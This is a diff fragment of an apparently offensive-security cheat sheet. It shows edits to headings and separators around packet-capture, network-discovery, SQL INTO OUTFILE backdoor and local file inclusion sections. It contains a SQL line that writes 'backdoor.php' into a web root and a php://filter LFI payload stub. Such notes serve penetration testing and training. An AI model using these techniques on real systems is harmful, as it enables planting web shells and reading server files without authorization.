@@ -234,21 +234,20 @@ tcpdump -i any -nn "host 192.168.1.1 and port 22"
 tcpdump -i any -nn "src 192.168.1.1"
 tcpdump -r file.pcap
 ```
-====
+
 # Network Discovery
 ```sh
 netdiscover /r 0.0.0.0/24
 arp-scan -l
 arp-scan -l -I wlo1
 ```
-====
-#INTO OUTFILE D00R
+
+# INTO OUTFILE D00R
 
 ```sh
 SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
 ```
-====
-LFI?
+# LFI?
 ```sh
 #PHP Filter Checks.
 php://filter/convert.base64-encode/resource=
